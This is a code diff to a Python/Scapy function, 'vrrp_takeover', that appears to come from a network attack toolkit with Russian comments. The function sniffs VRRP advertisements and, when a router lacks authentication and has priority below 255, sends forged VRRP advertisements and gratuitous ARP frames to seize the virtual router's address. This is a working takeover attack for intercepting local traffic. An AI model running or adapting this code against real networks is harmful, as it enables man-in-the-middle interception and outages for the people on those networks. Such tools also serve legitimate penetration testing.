@@ -7,13 +7,11 @@ from colorama import *
 def vrrp_takeover(interface):
     try:
         print(Fore.YELLOW + f"    [!] Detecting VRRP routers...\n")  # Переведено
-        global VRRPv2_with_non_auth_captured, VRRPv2_with_auth_captured, VRRPv3_captured
+        global VRRPv2_with_non_auth_captured
         VRRPv2_with_non_auth_captured = False  # Не захвачен
-        VRRPv2_with_auth_captured = False
-        VRRPv3_captured = False
 
         def vrrp_adv_reply(packet):
-            global src_ip, virtual_mac, advert_interval, VRRPv2_with_non_auth_captured, VRRPv2_with_auth_captured, VRRPv3_captured, virtual_rid, virtual_ip
+            global src_ip, virtual_mac, advert_interval, VRRPv2_with_non_auth_captured, virtual_rid, virtual_ip
             if packet.haslayer(VRRPv3):  # Если это VRRPv3
                 virtual_mac = packet[Ether].src
                 src_ip = packet[IP].src
@@ -32,7 +30,6 @@ def vrrp_takeover(interface):
                                    f"         IP: {src_ip}\n         Version: {Fore.RED}{version} (Temporarily unsupported){Fore.GREEN}\n"
                                    f"         Virtual Router ID: {virtual_rid}\n         Priority: {output_priority}\n         Advertisement Interval: {advert_interval} (cs)\n         Auth: {output_auth}\n"
                                    f"         Virtual IP Address: {virtual_ip}\n")  # Переведено
-                VRRPv3_captured = True
                 return True
 
             if packet.haslayer(VRRP):  # Если это VRRPv2
@@ -40,6 +37,7 @@ def vrrp_takeover(interface):
                 src_ip = packet[IP].src
                 version = packet[VRRP].version
                 virtual_rid = packet[VRRP].vrid
+                virtual_ip = packet[VRRP].addrlist
                 priority = packet[VRRP].priority
                 if priority == 255:
                     output_priority = f"{Fore.RED}255 (max){Fore.GREEN}"
@@ -49,14 +47,13 @@ def vrrp_takeover(interface):
                 auth = packet[VRRP].authtype
                 if auth == 1:
                     output_auth = f"{Fore.RED}Plain Text (Temporarily unsupported){Fore.GREEN}"
-                    VRRPv2_with_auth_captured = True
                 elif auth == 254:
                     output_auth = f"{Fore.RED}MD5 (Temporarily unsupported){Fore.GREEN}"
-                    VRRPv2_with_auth_captured = True
                 elif auth == 0:
                     output_auth = "None"
+
+                if priority < 255 and auth == 0:
                     VRRPv2_with_non_auth_captured = True
-                virtual_ip = packet[VRRP].addrlist
 
                 print(Fore.GREEN + f"    [+] [VRRP Router detected]\n         MAC: {virtual_mac.upper()}\n         IP: {src_ip}\n         Version: {version}\n"
                                  f"         Virtual Router ID: {virtual_rid}\n         Priority: {output_priority}\n         Advertisement Interval: {advert_interval} (sec)\n         Auth: {output_auth}\n"
@@ -65,6 +62,7 @@ def vrrp_takeover(interface):
 
         sniffer = AsyncSniffer(filter="ip proto 112", iface=interface, prn=lambda x: None, stop_filter=vrrp_adv_reply, timeout=10)
         sniffer.start()
+        time.sleep(11)
 
         def send_vrrp_packets():
             global virtual_ip, virtual_mac, advert_interval, virtual_rid
@@ -82,7 +80,7 @@ def vrrp_takeover(interface):
                     time.sleep(advert_interval)
 
             except KeyboardInterrupt:
-                print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено
+                print(Fore.YELLOW + f"    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено
 
         def send_garp_frames():
             try:
@@ -93,7 +91,7 @@ def vrrp_takeover(interface):
                     time.sleep(10)
 
             except KeyboardInterrupt:
-                print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено
+                print(Fore.YELLOW + f"    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено
 
         def send_arp_frames():
             def packet_analyze(packet):
@@ -107,8 +105,6 @@ def vrrp_takeover(interface):
             sniffer = AsyncSniffer(filter="arp", iface=interface, prn=packet_analyze)
             sniffer.start()
 
-        while VRRPv2_with_non_auth_captured == False and VRRPv2_with_auth_captured == False and VRRPv3_captured == False:
-            pass
         if VRRPv2_with_non_auth_captured == True:
             Thread(target=send_vrrp_packets, daemon=False).start()
             Thread(target=send_garp_frames, daemon=False).start()
@@ -119,4 +115,4 @@ def vrrp_takeover(interface):
             print(Fore.RED + f"    [-] %ERROR: Possible VRRP routers using AUTHENTICATION, MAX PRIORITY, or unsupported VRRP VERSION")  # Переведено
 
     except KeyboardInterrupt:
-        print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено
+        print(Fore.YELLOW + f"    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено
